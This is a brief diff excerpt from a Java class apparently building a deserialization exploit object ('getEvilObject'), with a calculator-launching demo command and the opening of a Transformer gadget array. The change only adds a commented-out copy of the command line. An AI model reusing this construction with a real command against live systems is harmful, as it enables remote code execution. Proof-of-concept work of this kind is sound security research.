@@ -31,6 +31,7 @@ public class Deserialize {
     }
 
     public static Object getEvilObject() throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException {
+//        String[] command = {"open -a calculator"};
         String[] command = {"open -a calculator"};
 
         final Transformer[] transformers = new Transformer[]{
